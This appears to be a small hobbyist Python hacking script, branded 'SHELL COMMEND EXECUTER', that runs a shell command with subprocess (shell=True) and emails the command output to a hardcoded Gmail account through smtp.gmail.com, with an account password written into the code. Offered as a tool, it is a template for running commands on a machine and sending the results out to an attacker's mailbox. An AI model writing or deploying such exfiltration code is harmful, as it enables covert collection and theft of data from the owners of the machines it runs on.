#before check to make less secure app is enable

import subprocess,smtplib

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls() # tls encrpted form ku because passwd is there
    server.login(email,password) #login
    server.sendmail(email,email,message)
    server.quit()#logout


print("""
 ##--------------------------------------------##
 #|                                            |#
 #|       ****ALL PLATFORMS ****               |#
 #|                                            |#
 #|      SHELL COMMEND EXECUTER>>>             |#
 #|                  BY.....                   |#
 #|                                            |#
 #|                    |*| cyber_jawahar       |#
 #|                                            |#
 ##--------------------------------------------##\n
 """)

command="dir"
output=subprocess.check_output(command,shell=True)
send_mail("anonymous02k2@gmail.com","12345@abcde",output)
